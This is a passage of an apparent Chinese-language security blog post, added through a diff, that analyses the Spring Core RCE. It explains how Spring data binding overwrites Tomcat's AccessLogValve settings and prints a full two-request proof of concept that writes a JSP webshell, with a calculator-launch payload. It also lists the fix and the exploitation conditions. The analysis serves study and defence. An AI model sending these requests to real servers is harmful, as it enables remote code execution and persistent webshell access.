+class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
+</code></pre><p>通过 <code>class.classLoader...first</code> 获取到的对象是 <code>AccessLogValve</code> 的实例，它是 Tomcat 中的 Access 日志的配置类，其中几个成员变量（这些属性都有相应的 <code>setter</code> 方法）：</p>
+<pre tabindex="0"><code>- directory: 控制日志文件的存储路径
+- prefix: 日志文件的文件名
+- suffix: 日志文件的后缀名
+- fileDateFormat: 日志时间的格式化方式
+- pattern: 日志内容的格式化方式，具有丰富的格式化方式
+</code></pre><p>对于具体的介绍，可以参考 <a href="https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html">官方文档</a> 。</p>
+<p>所以 Payload 中对于 <code>directory</code> ，<code>prefix</code> ，<code>suffix</code>  三个属性的覆盖，就可以把日志文件修改成一个 jsp 文件，然后将其放到 <code>webapps/ROOT</code> 目录中（日志文件的目录 <code>logs</code> 与 web 目录 <code>webapps</code> 同级），通过访问下面的这样一个路径，将 WebShell 写入日志文件中：</p>
+<pre tabindex="0"><code>http://localhost:8000/foo/&lt;%Runtime.getRuntime().exec(&#34;open -a calculator.app&#34;);%&gt;
+</code></pre><p>那么为什么要修改 <code>fileDateFormat</code> 呢，看起来似乎与写入 shell 没有关系，但其实只有修改了它才会触发日志文件的重新生成，每次记日志的时候，都会判断当前的时间格式方式和之前的是否相同，如果不相同，就会在 <code>dircetory</code> 指定的目录下重新生成日志文件 ，具体逻辑在 <code>org.apache.catalina.valves.AccessLogValve#rotate()</code> 方法中。</p>
+<h2 id="spring-core-rce">Spring-core RCE</h2>
+<p>我们把前面两个洞的利用方式综合一下，就可以写出这个 0day 的 POC 了，即通过 Spring 数据绑定的时候对 Bean 处理的特性，覆盖 <code>AccessLogValve</code> 中的变量，完成 webshell 的写入。但是在此之前还有一个问题，Spring 禁止了对 <code>Class</code> 类的 <code>classLoader</code> 属性的获取，所以得找到一个 <code>Class</code> 类的其他属性，且这个属性需要有 <code>getClassLoader()</code> 方法，并返回其 <code>classLoder</code> 的引用，才能 Bypass 这个 Spring 的黑名单。</p>
+<p>JDK9 之后引入了「模块化」的概念，每个 <code>Class</code> 对象都会有一个 <code>module</code> 属性，来表示自己属于哪个模块，每次类加载的时候，类加载器都会判断要加载的类的模块，如果可以找到它对应模块的类加载器，就会委派给模块的类加载器加载，而不是直接委托给父加载器。
+<code>module</code> 属性的类是 <code>java.lang.Module</code> ，正好有符合条件的 <code>getClassLoader()</code> 方法：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/Pasted%20image%2020220331165833.png" alt="Pasted image 20220331165833"></p>
+<p>在 Tomcat 的环境下，<code>class.getModule().getClassLoader()</code> 获取的依然是 <code>WebAppClassLoader</code> ，所以现在万事俱备，通过下面的属性嵌套就能完成对 <code>AcessLogValve</code> 的覆盖：</p>
+<pre tabindex="0"><code>class.module.resources.context.parent.pipeline.first.directory=webapps/ROOT
+...
+</code></pre><p>完整的 POC 为：</p>
+<pre tabindex="0"><code>###  
+POST http://localhost:8000/hello  
+Content-Type: application/x-www-form-urlencoded  
+  
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=vul&amp;
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1&amp;
+class.module.classLoader.resources.context.parent.pipeline.first.directory=/Users/jin/Desktop/WorkSpace/projects/springmvc-rce-demo/src/main/webapp&amp;
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{vul}i(%22open%20-a%20calculator.app%22)%3B%25{vul2}i&gt;  
+  
+  
+###  
+GET http://localhost:8000/hello?id=99  
+Accept: application/json  
+vul: &lt;%Runtime.getRuntime().exec  
+vul2: %
+</code></pre><p>在实际的环境中，<code>logs</code> 目录与 <code>webapps</code> 目录同级，所以 <code>directory</code> 可以设置成 <code>webapps/ROOT</code> 。</p>
+<p>对于这个 POC ，有几个要说明的点：</p>
+<ul>
+<li>在本地 Tomcat8 的环境下，不能直接访问类似于 Struts20 的一个带 webshell 的路径，这样的话日志中会记录 <code>&lt; % &quot;</code> 这些字符的 URL 编码，导致代码不能被解析。</li>
+<li>也不能直接在 <code>pattern</code> 中传入一句话，因为这样会不符合日志中 <code>pattern</code> 的规范，导致解码失败，无法覆盖 <code>pattern</code> 属性。</li>
+<li><code>%{xxx}i</code> 这种格式化方式可以获取请求头中 <code>xxx</code> 字段的值，而这些请求字段中的 <code>&lt; %</code> 这类字符可以不用编码直接传输，也会被完完整整地记录在日志文件中，这样就可以解决URL编码的问题。</li>
+</ul>
+<p>再发送完第一个 POST 包之后，再发送第二个带恶意字段的 GET 包，服务端就可以写入一个 webshell ：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/Pasted%20image%2020220331171719.png" alt="Pasted image 20220331171719"></p>
+<h2 id="fix">Fix</h2>
+<p>31 号的时候官方已经进行了修复，禁止了获取任何属性的 <code>classLoader</code> 和 <code>protectDomain</code> ：<a href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15">Commit</a></p>
+<p>总结一下这个漏洞的利用条件：</p>
+<ul>
+<li>JDK9+</li>
+<li>Spring后端使用变量绑定</li>
+<li>Spring以War包形式托管（最常见的是SpringMVC，外置Tomcat的SpringBoot应用很少见）</li>
+</ul>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">All posts</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#cve-2010-1622">CVE-2010-1622</a></li>
+    <li><a href="#structs-s2-020">Structs S2-020</a></li>
+    <li><a href="#spring-core-rce">Spring-core RCE</a></li>
+    <li><a href="#fix">Fix</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&text=Spring%20Core%20RCE" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&title=Spring%20Core%20RCE" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&is_video=false&description=Spring%20Core%20RCE" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Spring%20Core%20RCE&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&title=Spring%20Core%20RCE" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&title=Spring%20Core%20RCE" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&name=Spring%20Core%20RCE&description=Intro%20%e5%89%8d%e6%ae%b5%e6%97%b6%e9%97%b4%e7%9a%84Spring-core%20RCE%e4%bc%a0%e7%9a%84%e6%b2%b8%e6%b2%b8%e6%89%ac%e6%89%ac%ef%bc%8c%e8%87%aa%e5%b7%b1%e5%88%86%e6%9e%90%e5%ae%8c%e4%b9%8b%e5%90%8e%e8%a7%89%e5%be%97%e5%b9%b6%e6%b2%a1%e6%9c%89pr%e7%9a%84%e9%82%a3%e4%b9%88%e2%80%9c%e6%a0%b8%e5%bc%b9%e2%80%9d%ef%bc%8c%e5%8f%8d%e8%80%8c%e8%a7%89%e5%be%97%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e8%8c%83%e5%9b%b4%e5%85%b6%e5%ae%9e%e6%8c%ba%e7%aa%84%e7%9a%84%ef%bc%8c%e9%9a%8f%e7%9d%80%e5%ae%98%e6%96%b9%e4%bf%ae%e5%a4%8d%e7%9a%84%e6%9b%b4%e6%96%b0%ef%bc%8c%e8%bf%99%e4%b8%aa%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90%e7%bb%88%e4%ba%8e%e5%8f%af%e4%bb%a5%e5%8f%91%e5%87%ba%e6%9d%a5%e4%ba%86%e3%80%82%0a%e8%bf%99%e7%af%87%e6%96%87%e7%ab%a0%e5%b9%b6%e4%b8%8d%e6%83%b3%e5%81%9a%e6%9c%ba%e6%a2%b0%e7%9a%84%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90%ef%bc%8c%e6%89%80%e4%bb%a5%e4%b8%8d%e4%bc%9a%e6%b7%b1%e5%85%a5%e6%af%8f%e4%b8%80%e4%b8%aa%e7%bb%86%e8%8a%82%ef%bc%8c%e4%bd%86%e6%98%af%e4%bc%9a%e5%b0%86%e5%8e%86%e5%8f%b2%e4%b8%8a%e4%b8%80%e4%ba%9b%e7%9b%b8%e4%bc%bc%e7%9a%84%e6%bc%8f%e6%b4%9e%e6%8b%bf%e5%87%ba%e6%9d%a5%e4%bd%9c%e4%b8%ba%e6%8b%bc%e5%9b%be%ef%bc%8c%e6%9c%80%e5%90%8e%e6%8b%bc%e5%87%ba%e4%b8%80%e4%b8%aa%e5%ae%8c%e6%95%b4%e7%9a%84POC%e3%80%82%0a%e8%bf%99%e4%b8%aa%200day%20%e6%9c%ac%e8%b4%a8%e4%b8%8a%e6%98%af%e5%af%b9%20CVE-2010-1622%20%e7%9a%84%e7%bb%95%e8%bf%87%ef%bc%8c%e7%bb%93%e5%90%88%e4%ba%86%20Structs%20S2-020%20%e7%9a%84%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%ef%bc%8c%e5%ae%8c%e6%88%90%e5%af%b9%20Tomcat%20%e6%8e%a7%e5%88%b6%20Access%20%e6%97%a5%e5%bf%97%e7%9a%84%20AccessLogValve%20%e7%b1%bb%e7%9a%84%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%ef%bc%8c%e6%8e%a7%e5%88%b6%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6%e7%9a%84%e6%96%87%e4%bb%b6%e5%90%8d%e3%80%81%e5%90%8e%e7%bc%80%e3%80%81%e8%b7%af%e5%be%84%e5%92%8c%e5%86%85%e5%ae%b9%ef%bc%8c%e8%be%be%e5%88%b0%e5%90%91%20web%20%e7%9b%ae%e5%bd%95%e5%86%99%20shell%20%e7%9a%84%e7%9b%ae%e7%9a%84%e3%80%82%0aJavaBean%20%e7%9a%84%e4%b8%80%e8%88%ac%e8%a7%84%e8%8c%83%e5%b0%b1%e6%98%af%e6%88%90%e5%91%98%e5%8f%98%e9%87%8f%e7%94%a8%20private%20%e4%bf%ae%e9%a5%b0%ef%bc%8c%e7%84%b6%e5%90%8e%e9%80%89%e6%8b%a9%e6%80%a7%e7%9a%84%e8%ae%be%e7%bd%ae%e7%9b%b8%e5%ba%94%e7%9a%84%20setter%2fgetter%20%e6%96%b9%e6%b3%95%e3%80%82%e9%99%a4%e4%ba%86%e6%af%94%e8%be%83%e7%86%9f%e6%82%89%e7%9a%84%20Commons-BeanUtils%20%e4%b9%8b%e5%a4%96%ef%bc%8c%20Spring%20%e4%b8%ad%e4%b9%9f%e5%b0%81%e8%a3%85%e4%ba%86%e4%b8%80%e5%a5%97%e6%93%8d%e4%bd%9c%20Bean%20%e7%9a%84%e7%b1%bb%ef%bc%8c%e4%b8%bb%e8%a6%81%e5%ae%9e%e7%8e%b0%e5%9c%a8%20org.springframework.beans.BeanWrapperImpl%20%e4%b8%ad%ef%bc%8c%e5%ae%83%e6%98%af%e6%a0%b9%e6%8d%ae%20Bean%20%e4%b8%ad%e7%9a%84%20setter%2fgetter%20%e6%96%b9%e6%b3%95%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e5%af%b9%e5%ba%94%e7%9a%84%e5%b1%9e%e6%80%a7%ef%bc%8c%e8%bf%99%e5%b0%b1%e4%bc%9a%e5%af%bc%e8%87%b4%e4%b8%80%e4%b8%aa%e9%97%ae%e9%a2%98%ef%bc%9a%e5%a6%82%e6%9e%9c%20Bean%20%e4%b8%ad%e5%ad%98%e5%9c%a8%e4%b8%80%e4%b8%aa%20getFoo%28%29%2fsetFoo%28Foo%20foo%29%20%e6%96%b9%e6%b3%95%ef%bc%8c%e4%bd%86%e6%98%af%e5%8d%b4%e6%b2%a1%e6%9c%89%e5%af%b9%e5%ba%94%e7%9a%84%e5%b1%9e%e6%80%a7%20foo%20%ef%bc%8cSpring%20%e8%bf%98%e6%98%af%e4%bc%9a%e8%ae%a4%e4%b8%ba%20Bean%20%e5%ad%98%e5%9c%a8%e4%b8%80%e4%b8%aa%20foo%20%e5%b1%9e%e6%80%a7%ef%bc%8c%e5%b9%b6%e9%80%9a%e8%bf%87%20getFoo%28%29%20%e6%96%b9%e6%b3%95%e8%8e%b7%e5%8f%96%e5%ae%83%e7%9a%84%e5%80%bc%e3%80%82%e7%9c%8b%e4%b8%8b%e9%9d%a2%e8%bf%99%e4%b8%aa%e4%be%8b%e5%ad%90%ef%bc%9a%0a%40Test%20public%20void%20BeanWrapperTest%28%29%20%7b%20%20BeanWrapperImpl%20beanWrapper%20%3d%20new%20BeanWrapperImpl%28new%20User%28%29%29%3b%20%20Arrays.stream%28beanWrapper.getPropertyDescriptors%28%29%29.forEach%28System.out%3a%3aprintln%29%3b%20%7d%20%20%2f%2f%20%23%23%23%23%23%23%23%23%23%23%23%23%20%20org." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&t=Spring%20Core%20RCE" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2022  Hello World 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+  
+
+
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    },
+    svg: {
+      fontCache: 'global'
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+
+</html>
